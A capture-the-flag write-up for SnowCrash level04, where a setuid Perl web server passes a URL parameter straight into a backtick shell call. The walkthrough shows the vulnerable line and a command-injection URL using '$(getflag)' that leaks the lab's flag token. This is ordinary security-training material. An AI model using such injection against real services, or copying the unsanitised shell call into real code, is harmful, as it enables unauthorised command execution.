# level04

## Recognition

There is a perl script named level04.pl and owned by flag04, containing a script for a simple webserver hosted on 127.0.0.1:4747.

```bash
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

We can try to use `netstat` to see if that server is actually ran.
```bash
nternet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 *:4242                  *:*                     LISTEN
tcp        0      0 localhost:pcrd          *:*                     LISTEN
tcp6       0      0 [::]:4646               [::]:*                  LISTEN
tcp6       0      0 [::]:4747               [::]:*                  LISTEN
tcp6       0      0 [::]:http               [::]:*                  LISTEN
tcp6       0      0 [::]:4242               [::]:*                  LISTEN
udp        0      0 *:bootpc                *:*
Active UNIX domain sockets (only servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     STREAM     LISTENING     8781     @/com/ubuntu/upstart
unix  2      [ ACC ]     STREAM     LISTENING     10199    /var/run/acpid.socket
unix  2      [ ACC ]     STREAM     LISTENING     9186     /var/run/dbus/system_bus_socket
unix  2      [ ACC ]     SEQPACKET  LISTENING     9205     /run/udev/control
```


</br>
</br>

## Exploitation

The server is simply executing the command 
```perl
print `echo $y 2>&1`;
``` 

Where the $y argument is gotten from the x url query variable.

We can simply set the x variable to `$(getflag)` which will execute a subshell therefore echoing the flag to the web page.

```
http://snowcrash:4747/?x=$(getflag)
_____________________________________________________
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```